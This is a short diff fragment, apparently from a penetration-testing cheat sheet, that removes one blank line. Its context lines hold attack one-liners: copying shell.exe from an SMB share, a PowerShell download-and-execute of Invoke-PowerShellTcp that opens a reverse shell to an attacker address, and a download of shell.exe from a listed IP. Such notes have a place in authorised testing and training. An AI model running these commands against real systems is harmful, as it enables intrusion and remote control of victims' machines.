@@ -11,7 +11,6 @@ copy \\10.10.14.2\SHARE\6shell.exe
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.21.174.231:8000/shell.exe','shell.exe')"
-
 ```
 
 Sync time with DCs
